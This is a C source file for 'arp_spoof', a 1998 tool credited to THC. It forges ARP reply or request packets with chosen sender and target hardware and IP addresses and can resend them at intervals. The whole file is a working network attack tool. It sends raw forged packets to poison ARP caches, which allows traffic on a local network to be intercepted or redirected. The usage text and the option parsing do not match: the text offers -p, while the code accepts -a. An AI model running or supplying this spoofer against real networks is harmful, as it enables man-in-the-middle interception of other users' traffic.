/*
** Usage: arp_spoof -p -q -i <secs> sndr_hwaddr sndr_ipaddr trgt_hwaddr trgt_ipaddr
**        -p Reply
**        -q Request
**        -i interval in secs to repeat the sending
** Purpose: Spoof ARP Reply/Request packets
** Last Update: 1998/06/16
** Author: TICK [THC]
**
** Source of Information: - TCP/IP Ill. Vol. I
**                        - "Redir games..." - Paper by Yuri Volobuev
***********************************************************************************
** I feel like a man, with a gun up to his head...
**      ... I feel like god after he drops dead...
**          ... people told me that I'm mad...
**              ... that makes me sad...
**                  ... someone decided to killing me...
**                      ... yeah, now I'm free ;)
**                   -- junk right out of TICK's brain
***********************************************************************************
*/


#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <netdb.h>
#include <sys/socket.h>
#include <sys/types.h>
//#include <linux/in.h>
#include <arpa/inet.h>
#include <linux/if_ether.h>

#define HWADDR_LEN 6
#define IPADDR_LEN 4
#define FRAMETYPE 0x0806
#define HARDTYPE 0x01
#define PROTOTYPE 0x0800
#define OP_REQ 0x01
#define OP_REP 0x02

#define NETDEV "eth0"

#define USAGE(str)\
{\
   fprintf(stderr, "%s: -p -q -i <secs> src_hwaddr src_ipaddr dest_hwaddr dest_ipaddr\n", str); \
   fprintf(stderr, "\t-q\t\tarp question (request)\n\t-a\t\tarp answer (reply)\
\n\t-i <secs>\tresend interval (seconds)\n");\
   exit(-1);\
}

#define EXIT(str)\
{\
   fprintf(stderr, "%s", str);\
   exit(0);\
}

int errno;

u_int request = 0, reply = 0, interval = 0;
char *prog;


typedef struct
{
  u_char eth_dst[HWADDR_LEN];
  u_char eth_src[HWADDR_LEN];
  u_short frame_type;
  u_short hard_type;
  u_short prot_type;
  u_char hard_size;
  u_char prot_size;
  u_short op;
  u_char sndr_ethaddr[HWADDR_LEN];
  u_char sndr_ipaddr[IPADDR_LEN];
  u_char trgt_ethaddr[HWADDR_LEN];
  u_char trgt_ipaddr[IPADDR_LEN];
  u_char pad[18];     /* min. etherpacket size = 60 bytes */
} arppack;

/* these 2 routines are stolen from yuri volobuev's "Redir..."-Paper */
void get_ip_addr(struct in_addr *ipaddr, char *str);
void get_hw_addr(char *eth_dst, char *eth_src);

int main(int argc, char **argv)
{
  struct in_addr src_ip, dst_ip;
  struct sockaddr sin;
  int arpsock;
  int opt;
  arppack arp_packet;


  prog = argv[0];

  if((argc != 6) && (argc != 8))
    USAGE(prog)

  opterr = 0;
  while( (opt = getopt(argc, argv, "aAqQi:I:")) != EOF)
  {
    switch(opt)
    {
      case 'a':
      case 'A':
	reply = 1;
	break;
      case 'q':
      case 'Q':
        request = 1;
	break;
      case 'i':
      case 'I':
        interval = (u_int) atoi(optarg);
        break;
      default:
        USAGE(prog)
    }
  }

  if((reply && request) || (!reply && !request))
    EXIT("What should it be a ARP reply or a ARP request packet, damn jackhead!\n")

  argc -= optind;
  argv += optind;

  /*
  ** get ARP socket
  */
  if( (arpsock = socket(AF_INET, SOCK_PACKET, htons(ETH_P_ARP))) < 0)
    EXIT("ERROR: socket()\n")
  strcpy(sin.sa_data, NETDEV);

  /*
  ** set up packet
  */
  arp_packet.frame_type = htons(FRAMETYPE);
  arp_packet.hard_type = htons(HARDTYPE);
  arp_packet.prot_type = htons(PROTOTYPE);
  arp_packet.hard_size = HWADDR_LEN;
  arp_packet.prot_size = IPADDR_LEN;
  arp_packet.op = htons((reply ? OP_REP : OP_REQ));

  get_hw_addr(arp_packet.eth_src, argv[0]);
  get_hw_addr(arp_packet.sndr_ethaddr, argv[0]);
  get_hw_addr(arp_packet.eth_dst, argv[2]);
  get_hw_addr(arp_packet.trgt_ethaddr, argv[2]);
  get_ip_addr(&src_ip, argv[1]);
  memcpy(arp_packet.sndr_ipaddr, &src_ip, IPADDR_LEN);
  get_ip_addr(&dst_ip, argv[3]);
  memcpy(arp_packet.trgt_ipaddr, &dst_ip, IPADDR_LEN);

  bzero(arp_packet.pad,18);

  while(1)
  {
    if(sendto(arpsock, &arp_packet, sizeof(arp_packet), 0, &sin, sizeof(sin)) < 0)
      EXIT("ERROR: sendto()\n");
    if(! interval)
      exit(0);
    putchar('.');
    fflush(stdout);
    sleep(interval);
  }

  exit(0); /* never reached */
}

void get_ip_addr(struct in_addr* in_addr,char* str){

struct hostent *hostp;

in_addr->s_addr=inet_addr(str);
if(in_addr->s_addr == -1){
        if( (hostp = gethostbyname(str)))
                bcopy(hostp->h_addr,in_addr,hostp->h_length);
        else {
                fprintf(stderr,"send_arp: unknown host %s\n",str);
                exit(1);
                }
        }
}

void get_hw_addr(char* buf,char* str){

int i;
char c,val;

for(i=0;i<HWADDR_LEN;i++){
        if( !(c = tolower(*str++))) EXIT("Invalid hardware address\n")
        if(isdigit(c)) val = c-'0';
        else if(c >= 'a' && c <= 'f') val = c-'a'+10;
        else EXIT("Invalid hardware address\n")

        *buf = val << 4;
        if( !(c = tolower(*str++))) EXIT("Invalid hardware address\n")
        if(isdigit(c)) val = c-'0';
        else if(c >= 'a' && c <= 'f') val = c-'a'+10;
        else EXIT("Invalid hardware address\n")

        *buf++ |= val;

        if(*str == ':')str++;
        }
}
